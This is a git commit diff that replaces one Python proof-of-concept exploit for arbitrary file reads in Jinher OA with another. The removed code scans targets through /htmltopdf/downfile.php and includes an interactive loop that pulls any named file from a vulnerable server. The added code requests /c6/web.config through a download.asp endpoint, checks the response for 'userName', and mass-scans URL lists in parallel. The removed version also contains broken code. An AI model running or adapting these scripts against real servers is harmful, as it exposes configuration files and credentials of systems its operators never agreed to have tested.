7a21bcaf612988b6435d260cf0fa5018eca1d623
LittleBear <113894585+LittleBear4@users.noreply.github.com>
2022-11-14 15:21:19 +0800

    Add files via upload

--- main/Jinher(正在建设)/poc/金和oa_任意文件读取.py
+++ main/Jinher(正在建设)/poc/金和oa_任意文件读取.py
@@ -1,107 +1,52 @@
-import requests
-import re
 import sys
+import requests
 import urllib3
-from argparse import ArgumentParser
-import threadpool
-from urllib import parse
 import time
-import random
+import argparse
+import multiprocessing
 from rich.console import Console
+from bs4 import BeautifulSoup 
 
 console = Console()
 def now_time():
     return time.strftime("[%H:%M:%S] ", time.localtime())
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-filename = sys.argv[1]
-url_list=[]
-
-#随机ua
-def get_ua():
-	first_num = random.randint(55, 62)
-	third_num = random.randint(0, 3200)
-	fourth_num = random.randint(0, 140)
-	os_type = [
-		'(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
-		'(Macintosh; Intel Mac OS X 10_12_6)'
-	]
-	chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)
-
-	ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
-				   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
-				  )
-	return ua
-
-
-def check_vuln(url):
-	url = parse.urlparse(url)
-	url2=url.scheme + '://' + url.netloc 
-	headers = {
-		'User-Agent': get_ua(),
-	}
-	# data=base64.b64encode("eyJzZXQtcHJvcGVydHkiOnsicmVxdWVzdERpc3BhdGNoZXIucmVxdWVzdFBhcnNlcnMuZW5hYmxlUmVtb3RlU3RyZWFtaW5nIjp0cnVlfX0=")
-	try:
-		res2 = requests.get(url2 + '/htmltopdf/downfile.php?filename=downfile.php',headers=headers,timeout=10,verify=False)
-		if res2.status_code==200 and "<?php" in res2.text:
-			console.print(now_time() + ' [SUCCESS]  存在任意文件读取{}'.format(url2), style='bold green')
-			return 1
-		else:
-			console.print(now_time() + ' [WARNING]  漏洞不存在', style='bold red ')
-	except Exception as e:
-		console.print(now_time() + " [ERROR]    无法利用poc请求目标或被目标拒绝请求, ", style='bold red')
-
-
-#cmdshell
-def cmdshell(url):
-	if check_vuln(url)==1:
-		url = parse.urlparse(url)
-		url1 = url.scheme + '://' + url.netloc + '/htmltopdf/downfile.php?filename='
-		while 1:
-			filename = input("\033[35mfilename: \033[0m")
-			if filename =="exit":
-				sys.exit(0)
-			else:
-				headers = {
-					'User-Agent': get_ua(),
-					}
-				try:
-					res = requests.get(url1 + filename,headers=headers,timeout=10,verify=False)
-					if res.status_code==200 and len(res.text) != 0:
-						print("\033[32m%s\033[0m" %res.text)
-					else:
-						print("\033[31m[-]%s file does not exist !\033[0m" %url1)
-				except Exception as e:
-					print("\033[31m[-]%s is timeout!\033[0m" %url1)
-
-
-#多线程
-def multithreading(url_list, pools=5):
-	works = []
-	for i in url_list:
-		# works.append((func_params, None))
-		works.append(i)
-	# print(works)
-	pool = threadpool.ThreadPool(pools)
-	reqs = threadpool.makeRequests(check_vuln, works)
-	[pool.putRequest(req) for req in reqs]
-	pool.wait()
-
-
-if __name__ == '__main__':
-	parser = argparse.ArgumentParser() 
-    parser.add_argument('-u', '--url', dest='url', help='Target Url')
-    parser.add_argument('-f', '--file', dest='file', help='Target Url File', type=argparse.FileType('r'))
-	args=arg.parse_args()
-	url=args.url
-	filename=args.file 
-	if url != None and cmd == None and filename == None:
-		check_vuln(url)
-	elif url == None and cmd == None and filename != None:
-		start=time()
-		for i in open(filename):
-			i=i.replace('\n','')
-			check_vuln(i)
-		end=time()
-		print('任务完成，用时%d' %(end-start))
-	elif url == None and cmd != None and filename == None:
-		cmdshell(cmd)
+  
+def main(target_url):
+    if target_url[:4]!='http':
+        target_url = 'http://' + target_url
+    if target_url[-1]!='/':
+        target_url += '/' 
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
+        }
+    console.print(now_time() + " [INFO]     正在检测金和OA C6 download.jsp 任意文件读取漏洞", style='bold blue')
+    exp_url=target_url+"C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config"
+    try:
+        requests.packages.urllib3.disable_warnings()
+        response=requests.get(url=exp_url, headers=headers,verify=False)
+        if response.status_code== 200 and 'userName' in response.text:
+            console.print(now_time() + ' [SUCCESS]  金和OA C6 download.jsp 任意文件读取漏洞:{}'.format(exp_url), style='bold green')
+        else:
+            console.print(now_time() + ' [WARNING]  金和OA C6 download.jsp 任意文件读取漏洞不存在', style='bold red ')
+    except:
+        console.print(now_time() + ' [WARNING]  请求失败，可能无法与目标建立连接或目标不存在', style='bold red')
+  
+     
+if __name__ == "__main__":
+    try:
+        parser = argparse.ArgumentParser()
+        parser.add_argument('-u', '--url', dest='url', help='Target Url')
+        parser.add_argument('-f', '--file', dest='file', help='Target Url File', type=argparse.FileType('r'))
+        args = parser.parse_args()
+        if args.file:
+            pool = multiprocessing.Pool()
+            for url in args.file:
+                pool.apply_async(main, args=(url.strip('\n'),))
+            pool.close()
+            pool.join()
+        elif args.url:
+            main(args.url)
+        else:
+            print('缺少URL目标, 请使用 [-u URL] or [-f FILE]')
+    except KeyboardInterrupt:
+        console.print('\nCTRL+C 退出', style='reverse bold red')
